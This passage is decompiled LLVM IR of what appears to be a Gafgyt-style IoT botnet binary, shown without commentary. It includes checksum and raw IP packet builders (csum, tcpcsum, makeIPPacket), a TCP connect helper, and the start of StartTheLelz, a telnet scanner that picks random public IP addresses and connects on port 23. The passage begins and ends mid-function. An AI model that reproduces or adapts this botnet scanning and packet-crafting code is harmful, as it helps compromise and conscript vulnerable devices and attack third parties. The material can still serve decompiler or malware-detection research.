  %v2_10005c80 = icmp sgt i32 %v1_10005c74, 1
  br i1 %v2_10005c80, label %dec_label_pc_10005c38, label %dec_label_pc_10005c7c.dec_label_pc_10005c88_crit_edge

dec_label_pc_10005c7c.dec_label_pc_10005c88_crit_edge: ; preds = %dec_label_pc_10005c38
  %v3_10005c80.le = icmp eq i32 %v1_10005c74, 1
  br i1 %v3_10005c80.le, label %dec_label_pc_10005c94, label %dec_label_pc_10005d00.preheader

dec_label_pc_10005c88:                            ; preds = %entry
  %v3_10005c804 = icmp eq i32 %arg2, 1
  br i1 %v3_10005c804, label %dec_label_pc_10005c94, label %dec_label_pc_10005d00.preheader

dec_label_pc_10005c94:                            ; preds = %dec_label_pc_10005c7c.dec_label_pc_10005c88_crit_edge, %dec_label_pc_10005c88
  %stack_var_-24.0.lcssa20 = phi i16* [ %v5_10005c6c, %dec_label_pc_10005c7c.dec_label_pc_10005c88_crit_edge ], [ %arg1, %dec_label_pc_10005c88 ]
  %stack_var_-16.0.lcssa19 = phi i32 [ %v5_10005c58, %dec_label_pc_10005c7c.dec_label_pc_10005c88_crit_edge ], [ 0, %dec_label_pc_10005c88 ]
  %stack_var_-12.0.lcssa18 = phi i32 [ %v2_10005c54, %dec_label_pc_10005c7c.dec_label_pc_10005c88_crit_edge ], [ 0, %dec_label_pc_10005c88 ]
  %v1_10005c98 = bitcast i16* %stack_var_-24.0.lcssa20 to i8*
  %v2_10005c98 = load i8, i8* %v1_10005c98, align 1
  %v3_10005c98 = zext i8 %v2_10005c98 to i32
  %v2_10005cb0 = add i32 %v3_10005c98, %stack_var_-12.0.lcssa18
  %v3_10005cb0 = icmp ult i32 %v2_10005cb0, %stack_var_-12.0.lcssa18
  %v4_10005cb4 = zext i1 %v3_10005cb0 to i32
  %v5_10005cb4 = add i32 %v4_10005cb4, %stack_var_-16.0.lcssa19
  br label %dec_label_pc_10005d00.preheader

dec_label_pc_10005d00.preheader:                  ; preds = %dec_label_pc_10005c7c.dec_label_pc_10005c88_crit_edge, %dec_label_pc_10005c94, %dec_label_pc_10005c88
  %stack_var_-12.1.ph = phi i32 [ %v2_10005c54, %dec_label_pc_10005c7c.dec_label_pc_10005c88_crit_edge ], [ 0, %dec_label_pc_10005c88 ], [ %v2_10005cb0, %dec_label_pc_10005c94 ]
  %stack_var_-16.1.ph = phi i32 [ %v5_10005c58, %dec_label_pc_10005c7c.dec_label_pc_10005c88_crit_edge ], [ 0, %dec_label_pc_10005c88 ], [ %v5_10005cb4, %dec_label_pc_10005c94 ]
  %v1_10005d0429 = mul i32 %stack_var_-16.1.ph, 65536
  %v1_10005d0c30 = udiv i32 %stack_var_-12.1.ph, 65536
  %v2_10005d1031 = or i32 %v1_10005d0429, %v1_10005d0c30
  %v1_10005d1832 = udiv i32 %stack_var_-16.1.ph, 65536
  %v2_10005d2033 = or i32 %v2_10005d1031, %v1_10005d1832
  %v3_10005d2434 = icmp eq i32 %v2_10005d2033, 0
  br i1 %v3_10005d2434, label %dec_label_pc_10005d2c, label %dec_label_pc_10005cc4

dec_label_pc_10005cc4:                            ; preds = %dec_label_pc_10005d00.preheader, %dec_label_pc_10005cc4
  %v1_10005d1837 = phi i32 [ %v1_10005d18, %dec_label_pc_10005cc4 ], [ %v1_10005d1832, %dec_label_pc_10005d00.preheader ]
  %v2_10005d1036 = phi i32 [ %v2_10005d10, %dec_label_pc_10005cc4 ], [ %v2_10005d1031, %dec_label_pc_10005d00.preheader ]
  %stack_var_-12.135 = phi i32 [ %v2_10005cf0, %dec_label_pc_10005cc4 ], [ %stack_var_-12.1.ph, %dec_label_pc_10005d00.preheader ]
  %v1_10005cd0 = urem i32 %stack_var_-12.135, 65536
  %v2_10005cf0 = add i32 %v2_10005d1036, %v1_10005cd0
  %v3_10005cf0 = icmp ult i32 %v2_10005cf0, %v1_10005cd0
  %v4_10005cf4 = zext i1 %v3_10005cf0 to i32
  %v5_10005cf4 = add nuw nsw i32 %v4_10005cf4, %v1_10005d1837
  %v1_10005d04 = mul i32 %v5_10005cf4, 65536
  %v1_10005d0c = udiv i32 %v2_10005cf0, 65536
  %v2_10005d10 = or i32 %v1_10005d04, %v1_10005d0c
  %v1_10005d18 = udiv i32 %v5_10005cf4, 65536
  %v2_10005d20 = or i32 %v2_10005d10, %v1_10005d18
  %v3_10005d24 = icmp eq i32 %v2_10005d20, 0
  br i1 %v3_10005d24, label %dec_label_pc_10005d00.dec_label_pc_10005d2c_crit_edge, label %dec_label_pc_10005cc4

dec_label_pc_10005d00.dec_label_pc_10005d2c_crit_edge: ; preds = %dec_label_pc_10005cc4
  br label %dec_label_pc_10005d2c

dec_label_pc_10005d2c:                            ; preds = %dec_label_pc_10005d00.dec_label_pc_10005d2c_crit_edge, %dec_label_pc_10005d00.preheader
  %v4_10005d2c = zext i16 %tmp21 to i32
  %v1_10005d38 = xor i32 %v4_10005d2c, 65535
  ret i32 %v1_10005d38

; uselistorder directives
  uselistorder i32 %v2_10005d10, { 1, 0 }
  uselistorder i32 %v5_10005cf4, { 1, 0 }
  uselistorder i32 %v2_10005cf0, { 0, 2, 1 }
  uselistorder i32 %v1_10005d1832, { 1, 0 }
  uselistorder i32 %stack_var_-16.1.ph, { 1, 0 }
  uselistorder i32 %stack_var_-12.1.ph, { 1, 0 }
  uselistorder i32 %stack_var_-12.0.lcssa18, { 1, 0 }
  uselistorder i32 %v1_10005c74, { 0, 2, 1 }
  uselistorder i32 %v2_10005c54, { 0, 1, 3, 2 }
  uselistorder i32 %stack_var_-12.05, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder i16* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_10005cc4, { 1, 0 }
  uselistorder label %dec_label_pc_10005d00.preheader, { 1, 2, 0 }
  uselistorder label %dec_label_pc_10005c94, { 1, 0 }
  uselistorder label %dec_label_pc_10005c38, { 1, 0 }
}

define i32 @tcpcsum(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  %stack_var_-64 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v4_10005d50 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v4_10005d50, i32* %stack_var_-64, align 4
  store i32 %arg1, i32* %r9.global-to-local, align 4
  %v1_10005d7c = add i32 %arg1, 12
  %v2_10005d7c = inttoptr i32 %v1_10005d7c to i32*
  %v3_10005d7c = load i32, i32* %v2_10005d7c, align 4
  store i32 %arg1, i32* %r9.global-to-local, align 4
  %v1_10005d88 = add i32 %arg1, 16
  %v2_10005d88 = inttoptr i32 %v1_10005d88 to i32*
  %v3_10005d88 = load i32, i32* %v2_10005d88, align 4
  store i32 20, i32* @r3, align 4
  %v1_10005da4 = call i32 @htons(i32 20)
  store i32 32, i32* @r3, align 4
  store i32 268459460, i32* @lr, align 4
  %v0_10005dc0 = call i32 @malloc()
  store i32 %v0_10005dc0, i32* %r11.global-to-local, align 4
  store i32 %v3_10005d88, i32* %r10.global-to-local, align 4
  store i32 0, i32* %r9.global-to-local, align 4
  %v2_10005de0 = inttoptr i32 %v0_10005dc0 to i32*
  store i32 %v3_10005d7c, i32* %v2_10005de0, align 4
  %v0_10005de4 = load i32, i32* %r10.global-to-local, align 4
  %v1_10005de4 = load i32, i32* %r11.global-to-local, align 4
  %v2_10005de4 = add i32 %v1_10005de4, 4
  %v3_10005de4 = inttoptr i32 %v2_10005de4 to i32*
  store i32 %v0_10005de4, i32* %v3_10005de4, align 4
  %v0_10005de8 = load i32, i32* %r9.global-to-local, align 4
  %v1_10005de8 = load i32, i32* %r11.global-to-local, align 4
  %v2_10005de8 = add i32 %v1_10005de8, 8
  %v3_10005de8 = inttoptr i32 %v2_10005de8 to i32*
  store i32 %v0_10005de8, i32* %v3_10005de8, align 4
  %v1_10005df0 = add i32 %v0_10005dc0, 12
  store i32 %v1_10005df0, i32* %r11.global-to-local, align 4
  store i32 %tmp, i32* %r9.global-to-local, align 4
  %v2_10005df8 = load i32, i32* %arg2, align 4
  %v1_10005dfc = add i32 %tmp, 4
  %v2_10005dfc = inttoptr i32 %v1_10005dfc to i32*
  %v3_10005dfc = load i32, i32* %v2_10005dfc, align 4
  store i32 %v3_10005dfc, i32* %r10.global-to-local, align 4
  %v1_10005e00 = add i32 %tmp, 8
  %v2_10005e00 = inttoptr i32 %v1_10005e00 to i32*
  %v3_10005e00 = load i32, i32* %v2_10005e00, align 4
  %v1_10005e04 = add i32 %tmp, 12
  %v2_10005e04 = inttoptr i32 %v1_10005e04 to i32*
  %v3_10005e04 = load i32, i32* %v2_10005e04, align 4
  %v2_10005e08 = inttoptr i32 %v1_10005df0 to i32*
  store i32 %v2_10005df8, i32* %v2_10005e08, align 4
  %v0_10005e0c = load i32, i32* %r10.global-to-local, align 4
  %v1_10005e0c = load i32, i32* %r11.global-to-local, align 4
  %v2_10005e0c = add i32 %v1_10005e0c, 4
  %v3_10005e0c = inttoptr i32 %v2_10005e0c to i32*
  store i32 %v0_10005e0c, i32* %v3_10005e0c, align 4
  %v1_10005e10 = load i32, i32* %r11.global-to-local, align 4
  %v2_10005e10 = add i32 %v1_10005e10, 8
  %v3_10005e10 = inttoptr i32 %v2_10005e10 to i32*
  store i32 %v3_10005e00, i32* %v3_10005e10, align 4
  %v1_10005e14 = load i32, i32* %r11.global-to-local, align 4
  %v2_10005e14 = add i32 %v1_10005e14, 12
  %v3_10005e14 = inttoptr i32 %v2_10005e14 to i32*
  store i32 %v3_10005e04, i32* %v3_10005e14, align 4
  %v1_10005e18 = add i32 %tmp, 16
  %v2_10005e18 = inttoptr i32 %v1_10005e18 to i32*
  %v3_10005e18 = load i32, i32* %v2_10005e18, align 4
  %v1_10005e1c = load i32, i32* %r11.global-to-local, align 4
  %v2_10005e1c = add i32 %v1_10005e1c, 16
  %v3_10005e1c = inttoptr i32 %v2_10005e1c to i32*
  store i32 %v3_10005e18, i32* %v3_10005e1c, align 4
  %v5_10005e28 = inttoptr i32 %v0_10005dc0 to i16*
  %v6_10005e28 = call i32 @csum(i16* %v5_10005e28, i32 32, i32 %v3_10005e04, i32 %v3_10005e00, i32 %tmp)
  %sext = mul i32 %v6_10005e28, 65536
  %v1_10005e2c = sdiv i32 %sext, 65536
  store i32 %v0_10005dc0, i32* @r3, align 4
  store i32 268459580, i32* @lr, align 4
  %v0_10005e38 = call i32 @free()
  %v1_10005e40 = urem i32 %v1_10005e2c, 65536
  %v2_10005e48 = load i32, i32* %stack_var_-64, align 4
  store i32 %v2_10005e48, i32* %r11.global-to-local, align 4
  ret i32 %v1_10005e40

; uselistorder directives
  uselistorder i32 %v0_10005dc0, { 3, 2, 1, 0, 4 }
  uselistorder i32 %tmp, { 1, 0, 3, 2, 4, 5 }
  uselistorder i32* %r11.global-to-local, { 0, 1, 4, 2, 3, 5, 6, 7, 8 }
}

define i32 @makeIPPacket(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %tmp = trunc i32 %arg4 to i8
  %tmp1 = ptrtoint i32* %arg1 to i32
  %v1_10005e98 = call i32 @__asm_rlwimi(i32 5, i32 24, i32 4, i32 7)
  store i32 %v1_10005e98, i32* %arg1, align 4
  %v1_10005eac = call i32 @__asm_rlwimi(i32 4, i32 28, i32 0, i32 3)
  store i32 %v1_10005eac, i32* %arg1, align 4
  %v3_10005ebc = add i32 %tmp1, 1
  %v4_10005ebc = inttoptr i32 %v3_10005ebc to i8*
  store i8 0, i8* %v4_10005ebc, align 1
  %fold = add i32 %arg5, 20
  %v1_10005ed4 = trunc i32 %fold to i16
  %v3_10005ed4 = add i32 %tmp1, 2
  %v4_10005ed4 = inttoptr i32 %v3_10005ed4 to i16*
  store i16 %v1_10005ed4, i16* %v4_10005ed4, align 2
  %v0_10005ed8 = call i32 @rand_cmwc()
  %v1_10005ee8 = trunc i32 %v0_10005ed8 to i16
  %v3_10005ee8 = add i32 %tmp1, 4
  %v4_10005ee8 = inttoptr i32 %v3_10005ee8 to i16*
  store i16 %v1_10005ee8, i16* %v4_10005ee8, align 2
  %v3_10005ef4 = add i32 %tmp1, 6
  %v4_10005ef4 = inttoptr i32 %v3_10005ef4 to i16*
  store i16 0, i16* %v4_10005ef4, align 2
  %v3_10005f00 = add i32 %tmp1, 8
  %v4_10005f00 = inttoptr i32 %v3_10005f00 to i8*
  store i8 -1, i8* %v4_10005f00, align 1
  %v3_10005f0c = add i32 %tmp1, 9
  %v4_10005f0c = inttoptr i32 %v3_10005f0c to i8*
  store i8 %tmp, i8* %v4_10005f0c, align 1
  %v3_10005f18 = add i32 %tmp1, 10
  %v4_10005f18 = inttoptr i32 %v3_10005f18 to i16*
  store i16 0, i16* %v4_10005f18, align 2
  %v2_10005f24 = add i32 %tmp1, 12
  %v3_10005f24 = inttoptr i32 %v2_10005f24 to i32*
  store i32 %arg3, i32* %v3_10005f24, align 4
  %v2_10005f30 = add i32 %tmp1, 16
  %v3_10005f30 = inttoptr i32 %v2_10005f30 to i32*
  store i32 %arg2, i32* %v3_10005f30, align 4
  ret i32 %v0_10005ed8
}

define i32 @sclose(i32 %arg1) local_unnamed_addr {
entry:
  %v2_10005f68 = icmp sgt i32 %arg1, 2
  br i1 %v2_10005f68, label %dec_label_pc_10005f7c, label %dec_label_pc_10005f8c

dec_label_pc_10005f7c:                            ; preds = %entry
  store i32 ptrtoint (i32* @global_var_10005f84.173 to i32), i32* @lr, align 4
  %v1_10005f80 = call i32 @__libc_close(i32 %arg1)
  br label %dec_label_pc_10005f8c

dec_label_pc_10005f8c:                            ; preds = %entry, %dec_label_pc_10005f7c
  %storemerge = phi i32 [ 0, %dec_label_pc_10005f7c ], [ 1, %entry ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder label %dec_label_pc_10005f8c, { 1, 0 }
}

define i32 @socket_connect(i32 %arg1, i16 %arg2) local_unnamed_addr {
entry:
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  store i32 1, i32* %stack_var_-32, align 4
  store i32 268459996, i32* @lr, align 4
  %v1_10005fd8 = call i32 @__GI_gethostbyname(i32 %arg1)
  %v3_10005fe8 = icmp eq i32 %v1_10005fd8, 0
  br i1 %v3_10005fe8, label %dec_label_pc_10005ff0, label %dec_label_pc_10005ffc

dec_label_pc_10005ff0:                            ; preds = %entry
  br label %dec_label_pc_100060d4

dec_label_pc_10005ffc:                            ; preds = %entry
  %v1_10006000 = add i32 %v1_10005fd8, 16
  %v2_10006000 = inttoptr i32 %v1_10006000 to i32*
  %v3_10006000 = load i32, i32* %v2_10006000, align 4
  %v1_10006004 = inttoptr i32 %v3_10006000 to i32*
  %v2_10006004 = load i32, i32* %v1_10006004, align 4
  %v1_1000600c = add i32 %v1_10005fd8, 12
  %v2_1000600c = inttoptr i32 %v1_1000600c to i32*
  %v3_1000600c = load i32, i32* %v2_1000600c, align 4
  %v2_10006014 = ptrtoint i32* %stack_var_-48 to i32
  %v2_10006018 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v3_1000600c, i32* @r5, align 4
  store i32 268460076, i32* @lr, align 4
  %v4_10006028 = call i32 @bcopy(i32 %v2_10006004, i32 %v2_10006018, i32 %v3_1000600c, i32 %v2_10006014)
  %v4_1000602c = zext i16 %arg2 to i32
  store i32 %v4_1000602c, i32* @r3, align 4
  %v1_10006038 = call i32 @htons(i32 %v4_1000602c)
  store i32 2, i32* %stack_var_-48, align 4
  store i32 268460124, i32* @lr, align 4
  %v3_10006058 = call i32 @socket(i32 2, i32 1, i32 6)
  %v2_10006064 = ptrtoint i32* %stack_var_-32 to i32
  store i32 268460160, i32* @lr, align 4
  %v5_1000607c = call i32 @__GI_setsockopt(i32 %v3_10006058, i32 6, i32 1, i32 %v2_10006064, i32 4)
  %v4_10006088 = icmp eq i32 %v3_10006058, -1
  br i1 %v4_10006088, label %dec_label_pc_10006090, label %dec_label_pc_1000609c

dec_label_pc_10006090:                            ; preds = %dec_label_pc_10005ffc
  br label %dec_label_pc_100060d4

dec_label_pc_1000609c:                            ; preds = %dec_label_pc_10005ffc
  store i32 268460208, i32* @lr, align 4
  %v3_100060ac = call i32 @__libc_connect(i32 %v3_10006058, i32 %v2_10006014, i32 16)
  %v4_100060b8 = icmp eq i32 %v3_100060ac, -1
  br i1 %v4_100060b8, label %dec_label_pc_100060c0, label %dec_label_pc_100060cc

dec_label_pc_100060c0:                            ; preds = %dec_label_pc_1000609c
  br label %dec_label_pc_100060d4

dec_label_pc_100060cc:                            ; preds = %dec_label_pc_1000609c
  br label %dec_label_pc_100060d4

dec_label_pc_100060d4:                            ; preds = %dec_label_pc_100060c0, %dec_label_pc_10006090, %dec_label_pc_10005ff0, %dec_label_pc_100060cc
  %stack_var_-16.0 = phi i32 [ 0, %dec_label_pc_10005ff0 ], [ 0, %dec_label_pc_10006090 ], [ 0, %dec_label_pc_100060c0 ], [ %v3_10006058, %dec_label_pc_100060cc ]
  ret i32 %stack_var_-16.0

; uselistorder directives
  uselistorder i32 %v2_10006014, { 1, 0 }
  uselistorder i32 %v3_1000600c, { 1, 0 }
  uselistorder i32* %stack_var_-32, { 1, 0 }
  uselistorder label %dec_label_pc_100060d4, { 3, 0, 1, 2 }
}

define i32 @StartTheLelz(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r9.global-to-local = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-640 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v4_100060f4 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v4_100060f4, i32* %stack_var_-640, align 4
  store i32 268460328, i32* @lr, align 4
  %v1_10006124 = call i32 @__GI_time(i32 0)
  %v0_10006130 = call i32 @rand_cmwc()
  %v2_10006138 = xor i32 %v1_10006124, %v0_10006130
  store i32 ptrtoint (i32* @global_var_10006144.174 to i32), i32* @lr, align 4
  %v1_10006140 = call i32 @srand(i32 %v2_10006138)
  store i32 2, i32* %stack_var_-60, align 4
  store i32 23, i32* @r3, align 4
  %v1_10006150 = call i32 @htons(i32 23)
  %v2_10006160 = ptrtoint i32* %stack_var_-52 to i32
  store i32 %v2_10006160, i32* %r9.global-to-local, align 4
  store i32 0, i32* %stack_var_-52, align 4
  store i32 1025, i32* @r3, align 4
  store i32 268460412, i32* @lr, align 4
  %v0_10006178 = call i32 @malloc()
  store i32 1025, i32* %r9.global-to-local, align 4
  store i32 268460444, i32* @lr, align 4
  %v3_10006198 = call i32 @__GI_memset(i32 %v0_10006178, i32 0, i32 1025)
  %v1_100061a0 = mul i32 %arg2, 28
  %v1_100061a8 = add i32 %v1_100061a0, 30
  %v1_100061ac = and i32 %v1_100061a8, -16
  %v2_100061b4 = load i32, i32* %stack_var_-640, align 4
  %v1_100061bc = load i32, i32* @r1, align 4
  %v3_100061bc = sub i32 %v1_100061bc, %v1_100061ac
  %v4_100061bc = inttoptr i32 %v3_100061bc to i32*
  store i32 %v2_100061b4, i32* %v4_100061bc, align 4
  %v1_100061cc = add i32 %v3_100061bc, 23
  %v1_100061d0 = and i32 %v1_100061cc, -16
  store i32 %v1_100061d0, i32* %r9.global-to-local, align 4
  %v1_100061ec = mul i32 %arg2, 5
  store i32 ptrtoint (i32* @global_var_10006200.175 to i32), i32* @lr, align 4
  %v3_100061fc = call i32 @__GI_memset(i32 %v1_100061d0, i32 0, i32 %v1_100061ec)
  store i32 %arg2, i32* %r9.global-to-local, align 4
  %v2_1000629c10 = icmp sgt i32 %arg2, 0
  br i1 %v2_1000629c10, label %dec_label_pc_1000620c, label %dec_label_pc_100062a4

dec_label_pc_1000620c:                            ; preds = %entry, %dec_label_pc_1000620c
  %storemerge313 = phi i32 [ %v1_1000628c, %dec_label_pc_1000620c ], [ 0, %entry ]
  %v1_10006214 = mul i32 %storemerge313, 28
  %v2_10006218 = add i32 %v1_10006214, %v1_100061d0
  store i32 %v2_10006218, i32* %r9.global-to-local, align 4
  %v2_10006220 = inttoptr i32 %v2_10006218 to i32*
  store i32 0, i32* %v2_10006220, align 4
  %v1_10006228 = load i32, i32* %r9.global-to-local, align 4
  %v2_10006228 = add i32 %v1_10006228, 4
  %v3_10006228 = inttoptr i32 %v2_10006228 to i32*
  store i32 0, i32* %v3_10006228, align 4
  %v1_10006230 = load i32, i32* %r9.global-to-local, align 4
  %v2_10006230 = add i32 %v1_10006230, 8
  %v3_10006230 = inttoptr i32 %v2_10006230 to i32*
  store i32 0, i32* %v3_10006230, align 4
  %v1_10006238 = load i32, i32* %r9.global-to-local, align 4
  %v2_10006238 = add i32 %v1_10006238, 12
  %v3_10006238 = inttoptr i32 %v2_10006238 to i32*
  store i32 0, i32* %v3_10006238, align 4
  %v1_10006240 = load i32, i32* %r9.global-to-local, align 4
  %v2_10006240 = add i32 %v1_10006240, 16
  %v3_10006240 = inttoptr i32 %v2_10006240 to i32*
  store i32 0, i32* %v3_10006240, align 4
  %v1_10006248 = load i32, i32* %r9.global-to-local, align 4
  %v2_10006248 = add i32 %v1_10006248, 20
  %v3_10006248 = inttoptr i32 %v2_10006248 to i32*
  store i32 0, i32* %v3_10006248, align 4
  %v1_10006250 = load i32, i32* %r9.global-to-local, align 4
  %v2_10006250 = add i32 %v1_10006250, 24
  %v3_10006250 = inttoptr i32 %v2_10006250 to i32*
  store i32 0, i32* %v3_10006250, align 4
  %v3_10006268 = add i32 %v2_10006218, 9
  %v4_10006268 = inttoptr i32 %v3_10006268 to i8*
  store i8 1, i8* %v4_10006268, align 1
  %v1_1000627c = add i32 %v2_10006218, 24
  %v2_10006284 = inttoptr i32 %v1_1000627c to i32*
  store i32 %v0_10006178, i32* %v2_10006284, align 4
  %v1_1000628c = add nuw nsw i32 %storemerge313, 1
  store i32 %arg2, i32* %r9.global-to-local, align 4
  %v2_1000629c = icmp slt i32 %v1_1000628c, %arg2
  br i1 %v2_1000629c, label %dec_label_pc_1000620c, label %dec_label_pc_100062a4

dec_label_pc_100062a4:                            ; preds = %dec_label_pc_1000620c, %entry
  br label %dec_label_pc_100062ac

dec_label_pc_100062ac:                            ; preds = %dec_label_pc_100062ac, %dec_label_pc_100062a4
  %stack_var_-604.0 = phi i32 [ 0, %dec_label_pc_100062a4 ], [ %v1_100062b0, %dec_label_pc_100062ac ]
  %v1_100062b0 = add i32 %stack_var_-604.0, 1
  %v1_100062c4 = mul i32 %v1_100062b0, 4
  %v2_100062c8 = add i32 %v1_100062c4, ptrtoint ([10 x i8*]* @global_var_1002e194.186 to i32)
  store i32 %v2_100062c8, i32* %r9.global-to-local, align 4
  %v1_100062cc = inttoptr i32 %v2_100062c8 to i32*
  %v2_100062cc = load i32, i32* %v1_100062cc, align 4
  %v3_100062d0 = icmp eq i32 %v2_100062cc, 0
  br i1 %v3_100062d0, label %dec_label_pc_100062d8.preheader, label %dec_label_pc_100062ac

dec_label_pc_100062d8.preheader:                  ; preds = %dec_label_pc_100062ac
  %v2_10006320 = add i32 %v1_100061d0, 16
  %v2_10006434 = or i32 %v1_100061d0, 4
  %v2_1000663c = ptrtoint i32* %stack_var_-60 to i32
  br label %dec_label_pc_100062d8

dec_label_pc_100062d8:                            ; preds = %dec_label_pc_100062d8, %dec_label_pc_10007108, %dec_label_pc_100062d8.preheader
  store i32 %arg2, i32* %r9.global-to-local, align 4
  br i1 %v2_1000629c10, label %dec_label_pc_100062e4, label %dec_label_pc_100062d8

dec_label_pc_100062e4:                            ; preds = %dec_label_pc_100062d8, %dec_label_pc_10007108
  %storemerge48 = phi i32 [ %v1_1000710c, %dec_label_pc_10007108 ], [ 0, %dec_label_pc_100062d8 ]
  %v1_100062ec = mul i32 %storemerge48, 28
  %v2_100062f0 = add i32 %v1_100062ec, %v1_100061d0
  %v1_100062f4 = add i32 %v2_100062f0, 16
  store i32 %v1_100062f4, i32* %r9.global-to-local, align 4
  %v1_100062f8 = inttoptr i32 %v1_100062f4 to i32*
  %v2_100062f8 = load i32, i32* %v1_100062f8, align 4
  %v3_100062fc = icmp eq i32 %v2_100062f8, 0
  br i1 %v3_100062fc, label %dec_label_pc_10006304, label %dec_label_pc_1000632c

dec_label_pc_10006304:                            ; preds = %dec_label_pc_100062e4
  store i32 268460816, i32* @lr, align 4
  %v1_1000630c = call i32 @__GI_time(i32 0)
  %v1_1000631c = mul i32 %storemerge48, 28
  %v1_10006324 = add i32 %v2_10006320, %v1_1000631c
  store i32 %v1_10006324, i32* %r9.global-to-local, align 4
  %v2_10006328 = inttoptr i32 %v1_10006324 to i32*
  store i32 %v1_1000630c, i32* %v2_10006328, align 4
  br label %dec_label_pc_1000632c

dec_label_pc_1000632c:                            ; preds = %dec_label_pc_100062e4, %dec_label_pc_10006304
  store i32 %v2_100062f0, i32* %r9.global-to-local, align 4
  %v1_1000633c = add i32 %v2_100062f0, 8
  %v2_1000633c = inttoptr i32 %v1_1000633c to i8*
  %v3_1000633c = load i8, i8* %v2_1000633c, align 4
  %v2_1000634c = icmp ugt i8 %v3_1000633c, 7
  br i1 %v2_1000634c, label %dec_label_pc_10007108, label %dec_label_pc_10006354

dec_label_pc_10006354:                            ; preds = %dec_label_pc_1000632c
  %v4_1000633c = zext i8 %v3_1000633c to i32
  %v1_10006358 = mul nuw nsw i32 %v4_1000633c, 4
  %v2_10006364 = add i32 %v1_10006358, ptrtoint (i32* @global_var_10014398.187 to i32)
  store i32 %v2_10006364, i32* %r9.global-to-local, align 4
  %v1_10006368 = inttoptr i32 %v2_10006364 to i32*
  %v2_10006368 = load i32, i32* %v1_10006368, align 4
  store i32 ptrtoint (i32* @global_var_10010000.9 to i32), i32* %r9.global-to-local, align 4
  %v2_10006374 = add i32 %v2_10006368, ptrtoint (i32* @global_var_10014398.187 to i32)
  call void @__pseudo_branch(i32 %v2_10006374)
  store i32 %v2_100062f0, i32* %r9.global-to-local, align 4
  %v1_10006390 = add i32 %v2_100062f0, 9
  %v2_10006390 = inttoptr i32 %v1_10006390 to i8*
  %v3_10006390 = load i8, i8* %v2_10006390, align 1
  %v3_10006398 = icmp eq i8 %v3_10006390, 1
  store i32 %v1_100061d0, i32* %r9.global-to-local, align 4
  br i1 %v3_10006398, label %dec_label_pc_100063a0, label %dec_label_pc_10006444

dec_label_pc_100063a0:                            ; preds = %dec_label_pc_10006354
  %v1_100063b0 = add i32 %v2_100062f0, 24
  store i32 %v1_100063b0, i32* %r9.global-to-local, align 4
  %v1_100063b4 = inttoptr i32 %v1_100063b0 to i32*
  %v2_100063b4 = load i32, i32* %v1_100063b4, align 4
  store i32 %v2_100062f0, i32* %r9.global-to-local, align 4
  %v2_100063d0 = inttoptr i32 %v2_100062f0 to i32*
  store i32 0, i32* %v2_100063d0, align 4
  %v1_100063d8 = load i32, i32* %r9.global-to-local, align 4
  %v2_100063d8 = add i32 %v1_100063d8, 4
  %v3_100063d8 = inttoptr i32 %v2_100063d8 to i32*
  store i32 0, i32* %v3_100063d8, align 4
  %v1_100063e0 = load i32, i32* %r9.global-to-local, align 4
  %v2_100063e0 = add i32 %v1_100063e0, 8
  %v3_100063e0 = inttoptr i32 %v2_100063e0 to i32*
  store i32 0, i32* %v3_100063e0, align 4
  %v1_100063e8 = load i32, i32* %r9.global-to-local, align 4
  %v2_100063e8 = add i32 %v1_100063e8, 12
  %v3_100063e8 = inttoptr i32 %v2_100063e8 to i32*
  store i32 0, i32* %v3_100063e8, align 4
  %v1_100063f0 = load i32, i32* %r9.global-to-local, align 4
  %v2_100063f0 = add i32 %v1_100063f0, 16
  %v3_100063f0 = inttoptr i32 %v2_100063f0 to i32*
  store i32 0, i32* %v3_100063f0, align 4
  %v1_100063f8 = load i32, i32* %r9.global-to-local, align 4
  %v2_100063f8 = add i32 %v1_100063f8, 20
  %v3_100063f8 = inttoptr i32 %v2_100063f8 to i32*
  store i32 0, i32* %v3_100063f8, align 4
  %v1_10006400 = load i32, i32* %r9.global-to-local, align 4
  %v2_10006400 = add i32 %v1_10006400, 24
  %v3_10006400 = inttoptr i32 %v2_10006400 to i32*
  store i32 0, i32* %v3_10006400, align 4
  store i32 %v1_100063b0, i32* %r9.global-to-local, align 4
  store i32 %v2_100063b4, i32* %v1_100063b4, align 4
  %v1_10006424 = call i32 @GetRandomPublicIP(i32 %v1_100063b0)
  %v0_10006430 = load i32, i32* @r29, align 4
  %v1_10006430 = mul i32 %v0_10006430, 28
  %v1_10006438 = add i32 %v1_10006430, %v2_10006434
  store i32 %v1_10006438, i32* %r9.global-to-local, align 4
  %v2_1000643c = inttoptr i32 %v1_10006438 to i32*
  store i32 %v1_10006424, i32* %v2_1000643c, align 4
  br label %dec_label_pc_1000653c

dec_label_pc_10006444:                            ; preds = %dec_label_pc_10006354
  store i32 %v2_100062f0, i32* %r9.global-to-local, align 4
  %v3_10006454 = load i8, i8* %v2_10006390, align 1
  %v3_1000645c = icmp eq i8 %v3_10006454, 0
  br i1 %v3_1000645c, label %dec_label_pc_10006464, label %dec_label_pc_1000653c

dec_label_pc_10006464:                            ; preds = %dec_label_pc_10006444
  store i32 %v2_100062f0, i32* %r9.global-to-local, align 4
  %v1_10006474 = add i32 %v2_100062f0, 11
  %v2_10006474 = inttoptr i32 %v1_10006474 to i8*
  %v3_10006474 = load i8, i8* %v2_10006474, align 1
  %v1_1000647c = add i8 %v3_10006474, 1
  store i8 %v1_1000647c, i8* %v2_10006474, align 1
  store i32 %v2_100062f0, i32* %r9.global-to-local, align 4
  %v1_100064a4 = add i32 %v2_100062f0, 10
  %v2_100064a4 = inttoptr i32 %v1_100064a4 to i8*
